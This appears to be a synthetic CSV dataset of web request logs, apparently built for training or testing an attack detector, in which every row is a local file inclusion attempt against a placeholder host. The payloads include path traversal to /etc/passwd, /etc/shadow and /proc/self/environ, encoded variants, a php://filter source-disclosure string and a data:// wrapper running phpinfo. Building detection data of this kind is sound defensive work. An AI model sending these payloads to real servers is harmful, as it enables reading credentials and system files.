timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-01T14:58:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.76,13,6,24,0,200,891
2025-01-01T14:59:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,3.81,13,6,24,0,500,1144
2025-01-01T15:00:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.72,13,4,36,0,403,704
2025-01-01T15:01:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.42,10,5,19,0,200,854
2025-01-01T15:02:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.31,3,4,18,0,500,750
2025-01-01T15:03:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,3.98,13,6,22,0,200,918
2025-01-01T15:04:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.31,13,6,24,0,403,719
2025-01-01T15:05:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.39,13,4,36,0,500,1124
2025-01-01T15:06:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.23,13,6,22,0,200,1177
2025-01-01T15:07:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.59,4,1,21,0,200,789
2025-01-01T15:08:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.75,13,4,36,0,500,784
2025-01-01T15:09:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.63,4,1,21,0,403,1028
2025-01-01T15:10:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.73,13,6,22,0,500,1109
2025-01-01T15:11:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.6,15,7,28,0,200,728
2025-01-01T15:12:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.07,10,1,27,0,200,871
2025-01-01T15:13:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.4,7,1,28,0,500,724
2025-01-01T15:14:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.22,10,1,27,0,200,830
2025-01-01T15:15:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.83,13,4,36,0,403,980
2025-01-01T15:16:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,3.91,13,6,24,0,500,1018
2025-01-01T15:17:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,3.85,10,5,19,0,500,1195
2025-01-01T15:18:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.07,13,6,22,0,403,986
2025-01-01T15:19:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.26,13,6,24,0,403,917
2025-01-01T15:20:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.42,13,4,36,0,200,1095
2025-01-01T15:21:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,3.87,15,7,28,0,500,785
2025-01-01T15:22:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.01,13,6,22,0,200,856
2025-01-01T15:23:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.03,10,5,19,0,403,1181
2025-01-01T15:24:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.79,15,7,28,0,403,984
2025-01-01T15:25:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,3.96,9,5,53,0,403,1107
2025-01-01T15:26:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.66,10,5,19,0,403,923
2025-01-01T15:27:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.02,13,4,36,0,403,972
2025-01-01T15:28:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.43,9,5,53,0,200,791
2025-01-01T15:29:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.17,13,6,22,0,403,830
2025-01-01T15:30:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.39,4,1,21,0,500,1197
2025-01-01T15:31:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.92,10,5,19,0,500,1021
2025-01-01T15:32:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.15,10,1,27,0,500,841
2025-01-01T15:33:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.93,13,6,24,0,200,1006
2025-01-01T15:34:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.02,10,5,19,0,403,925
2025-01-01T15:35:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.3,15,7,28,0,403,1002
2025-01-01T15:36:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.39,7,1,28,0,500,912
2025-01-01T15:37:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.62,9,5,53,0,200,1012
2025-01-01T15:38:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.1,13,6,24,0,403,717
2025-01-01T15:39:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.75,13,6,22,0,403,739
2025-01-01T15:40:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.61,9,5,53,0,200,733
2025-01-01T15:41:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.03,3,4,18,0,403,1195
2025-01-01T15:42:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.26,13,6,22,0,200,1123
2025-01-01T15:43:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.87,9,5,53,0,403,794
2025-01-01T15:44:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,3.94,10,5,19,0,403,934
2025-01-01T15:45:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,3.93,10,5,19,0,200,987
2025-01-01T15:46:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.21,10,1,27,0,500,733
2025-01-01T15:47:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,3.99,13,4,36,0,500,775
2025-01-01T15:48:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.34,7,1,28,0,403,1055
2025-01-01T15:49:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.13,15,7,28,0,403,1123
2025-01-01T15:50:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.52,13,6,24,0,200,831
2025-01-01T15:51:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.01,10,5,19,0,403,1195
2025-01-01T15:52:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.57,13,6,22,0,200,723
2025-01-01T15:53:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.28,13,6,22,0,500,858
2025-01-01T15:54:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.09,9,5,53,0,500,1078
2025-01-01T15:55:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.53,15,7,28,0,403,1083
2025-01-01T15:56:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.97,10,5,19,0,403,772
2025-01-01T15:57:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.82,13,6,22,0,403,1042
2025-01-01T15:58:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.26,13,6,22,0,200,908
2025-01-01T15:59:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.85,9,5,53,0,200,1122
2025-01-01T16:00:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.65,7,1,28,0,403,1019
2025-01-01T16:01:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.23,13,4,36,0,500,1129
2025-01-01T16:02:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.55,9,5,53,0,200,1180
2025-01-01T16:03:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.45,9,5,53,0,500,931
2025-01-01T16:04:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.78,4,1,21,0,200,899
2025-01-01T16:05:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.36,7,1,28,0,403,1084
2025-01-01T16:06:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.45,13,6,22,0,200,711
2025-01-01T16:07:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.6,3,4,18,0,403,806
2025-01-01T16:08:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.39,10,1,27,0,403,820
2025-01-01T16:09:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.48,10,5,19,0,200,1036
2025-01-01T16:10:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.73,13,6,24,0,200,869
2025-01-01T16:11:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.3,15,7,28,0,500,1150
2025-01-01T16:12:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.29,10,1,27,0,500,1076
2025-01-01T16:13:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.33,10,1,27,0,403,1036
2025-01-01T16:14:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.91,10,5,19,0,403,902
2025-01-01T16:15:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.35,13,6,24,0,500,758
2025-01-01T16:16:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.29,9,5,53,0,403,1079
2025-01-01T16:17:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.48,13,4,36,0,200,1177
2025-01-01T16:18:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.15,15,7,28,0,403,809
2025-01-01T16:19:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.19,10,5,19,0,200,1137
2025-01-01T16:20:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.7,13,6,24,0,200,861
2025-01-01T16:21:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.12,9,5,53,0,403,910
2025-01-01T16:22:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.62,13,4,36,0,500,878
2025-01-01T16:23:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.53,4,1,21,0,403,834
2025-01-01T16:24:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.53,4,1,21,0,403,1184
2025-01-01T16:25:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.92,15,7,28,0,403,877
2025-01-01T16:26:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.13,13,6,22,0,500,750
2025-01-01T16:27:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.05,4,1,21,0,403,1145
2025-01-01T16:28:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.59,10,5,19,0,200,896
2025-01-01T16:29:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.46,10,5,19,0,500,923
2025-01-01T16:30:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.96,7,1,28,0,200,1149
2025-01-01T16:31:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.23,10,5,19,0,403,844
2025-01-01T16:32:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.4,13,6,22,0,500,850
2025-01-01T16:33:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.03,3,4,18,0,403,1083
2025-01-01T16:34:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.66,13,6,22,0,200,1079
2025-01-01T16:35:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.48,13,4,36,0,403,909
2025-01-01T16:36:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.87,10,5,19,0,500,1198
2025-01-01T16:37:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.24,10,1,27,0,403,1115
2025-01-01T16:38:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.02,13,6,24,0,200,931
2025-01-01T16:39:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.31,15,7,28,0,403,1092
2025-01-01T16:40:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,3.97,13,4,36,0,403,966
2025-01-01T16:41:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.73,10,1,27,0,500,780
2025-01-01T16:42:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.2,13,4,36,0,200,1033
2025-01-01T16:43:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,3.98,13,4,36,0,403,1114
2025-01-01T16:44:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.77,4,1,21,0,200,954
2025-01-01T16:45:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.06,13,6,24,0,200,987
2025-01-01T16:46:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.06,4,1,21,0,200,1047
2025-01-01T16:47:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.11,10,1,27,0,403,1055
2025-01-01T16:48:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.02,9,5,53,0,200,1198
2025-01-01T16:49:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.73,13,6,24,0,200,1148
2025-01-01T16:50:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.79,15,7,28,0,200,839
2025-01-01T16:51:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.76,13,4,36,0,500,769
2025-01-01T16:52:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.39,10,1,27,0,403,895
2025-01-01T16:53:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.7,4,1,21,0,403,801
2025-01-01T16:54:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.6,9,5,53,0,403,1080
2025-01-01T16:55:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.27,9,5,53,0,403,937
2025-01-01T16:56:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.47,15,7,28,0,200,1151
2025-01-01T16:57:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.0,13,4,36,0,200,961
2025-01-01T16:58:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.58,9,5,53,0,500,747
2025-01-01T16:59:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.39,13,4,36,0,200,798
2025-01-01T17:00:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.07,10,1,27,0,500,900
2025-01-01T17:01:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.08,15,7,28,0,403,1068
2025-01-01T17:02:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.01,7,1,28,0,403,1138
2025-01-01T17:03:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,3.87,4,1,21,0,500,1040
2025-01-01T17:04:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.95,3,4,18,0,403,1169
2025-01-01T17:05:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.07,9,5,53,0,500,938
2025-01-01T17:06:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.93,15,7,28,0,500,951
2025-01-01T17:07:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.29,3,4,18,0,200,1098
2025-01-01T17:08:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.59,13,4,36,0,403,829
2025-01-01T17:09:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.42,15,7,28,0,200,752
2025-01-01T17:10:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.02,13,6,24,0,200,1191
2025-01-01T17:11:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.69,13,6,22,0,500,803
2025-01-01T17:12:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.01,13,6,24,0,500,1132
2025-01-01T17:13:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.61,3,4,18,0,500,859
2025-01-01T17:14:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.29,13,4,36,0,403,983
2025-01-01T17:15:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.69,13,4,36,0,200,1174
2025-01-01T17:16:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.65,15,7,28,0,403,1154
2025-01-01T17:17:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.39,13,6,22,0,200,765
2025-01-01T17:18:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.86,10,5,19,0,200,945
2025-01-01T17:19:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.33,10,1,27,0,500,907
2025-01-01T17:20:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.44,13,6,22,0,200,989
2025-01-01T17:21:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.74,3,4,18,0,200,785
2025-01-01T17:22:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.6,3,4,18,0,403,703
2025-01-01T17:23:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.31,15,7,28,0,200,1078
2025-01-01T17:24:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.01,4,1,21,0,200,1043
2025-01-01T17:25:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.25,4,1,21,0,200,854
